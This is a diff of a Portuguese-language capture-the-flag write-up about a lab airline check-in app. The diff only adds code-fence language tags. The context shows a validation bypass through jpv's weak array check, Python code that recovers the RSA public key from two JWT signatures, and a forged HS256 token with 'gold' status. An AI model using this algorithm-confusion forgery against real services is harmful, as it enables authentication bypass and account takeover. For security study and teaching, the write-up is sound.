@@ -4,7 +4,7 @@ Temos uma aplicação web de check-in em uma companhia aérea. Existem dois endp
 
 A função que recupera a flag é bem óbvia e é mostrada no código a seguir, que é uma requisição do tipo POST para /upgrades/flag:
 
-```
+```js
 router.post('/flag', [getLoyaltyStatus], function(req, res, next) {
   if (res.locals.token && res.locals.token.status == "gold") {
     var response = {msg: config.flag };
@@ -25,7 +25,7 @@ A biblioteca jpv tem como intuito validar inputs de usuário comparando com patt
 
 Os seguintes padrões são definidos:
 
-```
+```js
 const pattern = {
   firstName: /^\w{1,30}$/,
   lastName: /^\w{1,30}$/,
@@ -45,7 +45,8 @@ Para satisfazer essa verificação e bypassar a validação do jpv, exploramos a
 A validação do campo extras é feita com um pattern que espera um array de objetos com sssr cujo valor seja uma das strings BULK, UMNR ou VGML. Na prática, em jpv@2.0.1 a verificação de "é array?" foi implementada de forma insegura: a biblioteca checa algo como ```obj.constructor.name === 'Array'``` (ou similar), o que é contornável porque, em JavaScript, o campo constructor de um objeto é mutável (ou é possível fornecer um objeto com ```constructor.name = "Array"```).
 
 Utilzamos um payload como o seguinte:
-```
+
+```js
     "firstName": "Algum",
     "lastName": "Nome",
     "passport": "123456789",
@@ -66,7 +67,7 @@ Com isso conseguimos vazar tokens diferentes apenas alterando o valor do campo "
 
 O JWT tem um campo "alg" no header que indica o algoritmo usado na assinatura (RS256, HS256, etc). RS256 usa RSA (chave privada para assinar, pública para verificar). Já o HS256 usa HMAC-SHA256 (um segredo simétrico compartilhado). No caso desse desafio, está sendo utilizada o algoritmo RS256 como é possível verificar no arquivo ckeckin.js:
 
-```
+```js
 function createToken(passport, frequentFlyerNumber) {
   var status = isSpecialCustomer(passport, frequentFlyerNumber) ? "gold" : "bronze";
   var body = {"status": status, "ffp": frequentFlyerNumber};
@@ -76,7 +77,7 @@ function createToken(passport, frequentFlyerNumber) {
 
 Porém, em upgrade.js o token é decodificado assim:
 
-```
+```js
 function getLoyaltyStatus(req, res, next) {
   if (req.headers.authorization) {
     let token = req.headers.authorization.split(" ")[1];
@@ -105,7 +106,7 @@ A verificação é feita com ```sig^e mod n == pt (mod n)```.
 
 Para encontrar o valor do módulo n e recuperar a chave pública original, usamos uma função auxiliar get_magic() com valores de "e" arbitrários (nesse caso testamos apenas os valores mais comuns e encontramos que foi utilizado o clássico valor 65537):
 
-```
+```python
 def get_magic(jwt_token: str, e: int) -> gmpy2.mpz:
     """
     Calcula o valor sig**e - pt para um JWT assinado com RS256.
@@ -122,7 +123,7 @@ def get_magic(jwt_token: str, e: int) -> gmpy2.mpz:
 
 Temos assim um possível k*n (sendo k um número inteiro qualquer). Com os dois tokens diferentes conseguimos tirar o gcd e descobrir o valor do módulo n, tornando possível a recuperação da chave pública:
 
-```
+```python
 pubkey = RSA.construct((int(N), int(e)))
 pem_rsa = pubkey.export_key()
 print("\nChave pública PEM:")
@@ -137,7 +138,7 @@ Testamos também mudar o "alg" para "none" como descrito em https://auth0.com/bl
 
 Assim, utilizamos a chave RSA do formato PEM como string literal para assinar o token forjado com o algoritmo HS256 e alteramos o payload para o status "gold":
 
-```
+```python
 message = f"{header_b64}.{payload_b64}"
 signature = hmac.new(pem_rsa, message.encode(), hashlib.sha256).digest()
 signature_b64 = b64url_encode(signature)
@@ -146,7 +147,7 @@ jwt_hs_token = f"{message}.{signature_b64}"
 
 Com isso conseguimos forjar um token JWT que passa por todas as verificações e retorna a flag ao enviá-lo para o endpoint /upgrades/flag com uma requisição POST.
 
-```
+```python
 headers = {"Authorization": f"Bearer {jwt_hs_token}"}
 res = requests.post(f"{URL_BASE}/upgrades/flag", headers=headers).json()
 print("\nResposta do servidor:")
